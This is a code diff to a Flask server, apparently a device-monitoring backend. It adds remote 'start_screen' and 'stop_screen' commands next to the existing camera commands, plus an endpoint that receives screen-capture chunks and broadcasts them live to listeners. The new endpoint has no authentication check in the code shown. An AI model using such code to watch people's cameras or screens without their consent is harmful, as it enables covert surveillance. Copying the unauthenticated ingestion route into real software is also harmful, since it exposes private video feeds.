@@ -648,8 +648,8 @@ def send_camera_command(device_id):
         data = request.get_json()
         command = data.get('command', '').lower().strip()
         
-        if command not in ['start_camera', 'start_camera_front', 'start_camera_back', 'stop_camera']:
-            return jsonify({'error': 'Invalid command. Use "start_camera", "start_camera_front", "start_camera_back", or "stop_camera"'}), 400
+        if command not in ['start_camera', 'start_camera_front', 'start_camera_back', 'stop_camera', 'start_screen', 'stop_screen']:
+            return jsonify({'error': 'Invalid command. Use "start_camera", "start_camera_front", "start_camera_back", "stop_camera", "start_screen", or "stop_screen"'}), 400
             
         # We can reuse the DeviceCommand table for this
         # Clear any existing pending commands for this device
@@ -705,6 +705,33 @@ def receive_livestream_feed():
             
         # Broadcast to all listeners in the specific device's video room
         socketio.emit('video_chunk', {'chunk': chunk_b64}, room=f'video_listeners_{actual_device_id}', namespace='/stream')
+            
+        return jsonify({"status": "Chunk broadcasted"}), 200
+        
+    return jsonify({"error": "No chunk data"}), 400
+
+@routes.route('/api/audit/livestream/screen_feed', methods=['POST'])
+def receive_screen_feed():
+    """Endpoint that receives continuous screen capture chunks and broadcasts them"""
+    device_id = request.form.get('device_id', 'unknown')
+    is_first_chunk = request.form.get('is_first_chunk') == 'true'
+    
+    if 'chunk' in request.files:
+        import base64
+        from app import socketio
+        from app.streaming import screen_init_segments
+        from .device_utils import resolve_to_device_id
+        
+        chunk_file = request.files['chunk']
+        chunk_data = chunk_file.read()
+        
+        chunk_b64 = base64.b64encode(chunk_data).decode('utf-8')
+        actual_device_id = resolve_to_device_id(device_id)
+        
+        if is_first_chunk:
+            screen_init_segments[actual_device_id] = chunk_b64
+            
+        socketio.emit('screen_chunk', {'chunk': chunk_b64}, room=f'screen_listeners_{actual_device_id}', namespace='/stream')
             
         return jsonify({"status": "Chunk broadcasted"}), 200
         
